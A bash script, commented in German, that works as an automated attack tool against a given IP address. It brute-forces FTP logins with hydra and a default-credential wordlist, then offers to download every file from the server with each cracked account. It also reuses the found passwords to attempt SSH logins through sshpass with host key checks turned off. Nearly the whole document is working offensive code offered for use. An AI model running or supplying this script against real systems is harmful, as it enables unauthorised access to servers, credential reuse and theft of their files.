#!/bin/bash

# ABegrüßungsnachricht
echo -e "EchoHel"

echo -e "\033[1;32mWelcome to the FTP and SSH Brute-Force Script!\033[0m"
echo -e "\033[1;34m[*] Starting script...\033[0m"

# Überprüfen, ob die IP-Adresse übergeben wurde
if [ -z "$1" ]; then
  echo -e "\033[1;31mUsage: $0 <IP>\033[0m"
  exit 1
fi

TARGET_IP=$1
FTP_WORDLIST="/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt"
DOWNLOAD_DIR="$HOME/ftp_downloads"

# Brute-Force Angriff auf FTP
echo -e "\033[1;34m[*] Starting FTP brute-force attack...\033[0m"
hydra -C $FTP_WORDLIST $TARGET_IP ftp -o ftp_bruteforce_results.txt

# Überprüfen, ob gültige FTP-Zugangsdaten gefunden wurden
VALID_CREDENTIALS=$(grep -Eo "host: $TARGET_IP +login: [^ ]+ +password: [^ ]+" ftp_bruteforce_results.txt | awk '{print $4":"$6}' | sort -u)
if [ -z "$VALID_CREDENTIALS" ]; then
  echo -e "\033[1;31m[!] No valid FTP credentials found.\033[0m"
  exit 1
fi

echo -e "\033[1;32m[*] Valid FTP credentials found:\033[0m"
echo "$VALID_CREDENTIALS" | sed 's/^/    - /'

# Abfrage, ob alle gefundenen Dateien heruntergeladen werden sollen
read -p "$(echo -e "\033[1;33mDo you want to download files with all found credentials? (y/n): \033[0m")" DOWNLOAD_ALL

if [ "$DOWNLOAD_ALL" = "y" ]; then
  mkdir -p $DOWNLOAD_DIR
  echo -e "\033[1;34m[*] Processing each found FTP credential...\033[0m"

  while IFS=: read -r FTP_USER FTP_PASS; do
    echo -e "\033[1;34m[*] Trying to connect to FTP server with credentials $FTP_USER:$FTP_PASS...\033[0m"
    FILE_LIST=$(echo -e "user $FTP_USER $FTP_PASS\nls\nbye" | ftp -n $TARGET_IP | awk '{print $9}' | grep -v "^$")

    if [ -n "$FILE_LIST" ]; then
      echo -e "\033[1;32m[*] Files available on FTP server with credentials $FTP_USER:$FTP_PASS:\033[0m"
      echo "$FILE_LIST" | sed 's/^/    - /'
      
      echo -e "\033[1;33mDo you want to download files for credentials $FTP_USER:$FTP_PASS? (y/n): \033[0m"
      read -p "Download (y/n): " DOWNLOAD_FOR_CREDENTIALS

      if [ "$DOWNLOAD_FOR_CREDENTIALS" = "y" ]; then
        echo -e "\033[1;34m[*] Downloading files for credentials $FTP_USER:$FTP_PASS...\033[0m"
        echo -e "user $FTP_USER $FTP_PASS\ncd /\nmget *\nbye" | ftp -n $TARGET_IP -o $DOWNLOAD_DIR
      else
        echo -e "\033[1;33m[*] Skipping file download for credentials $FTP_USER:$FTP_PASS.\033[0m"
      fi
    else
      echo -e "\033[1;31m[!] No files found with $FTP_USER:$FTP_PASS\033[0m"
    fi
  done <<< "$VALID_CREDENTIALS"

  echo -e "\033[1;32m[*] Files downloaded to $DOWNLOAD_DIR.\033[0m"
else
  echo -e "\033[1;33m[*] Skipping file download.\033[0m"
fi

# Abfrage nach SSH-Benutzernamen
read -p "$(echo -e "\033[1;33mEnter the usernames for SSH login (comma-separated): \033[0m")" SSH_USERS

# Testen der gefundenen Credentials für den SSH-Zugang
echo -e "\033[1;34m[*] Testing found credentials for SSH access...\033[0m"

IFS=',' read -ra USER_ARRAY <<< "$SSH_USERS"
for SSH_USER in "${USER_ARRAY[@]}"; do
  while IFS=: read -r FTP_USER FTP_PASS; do
    echo -e "\033[1;34m[*] Trying SSH login with $SSH_USER and password $FTP_PASS...\033[0m"
    sshpass -p $FTP_PASS ssh -o StrictHostKeyChecking=no -o BatchMode=yes $SSH_USER@$TARGET_IP exit
    if [ $? -eq 0 ]; then
      echo -e "\033[1;32m[+] SSH login successful with $SSH_USER:$FTP_PASS\033[0m"
    else
      echo -e "\033[1;31m[!] SSH login failed with $SSH_USER:$FTP_PASS\033[0m"
    fi
  done <<< "$VALID_CREDENTIALS"
done

echo -e "\033[1;34m[*] Script execution completed.\033[0m"
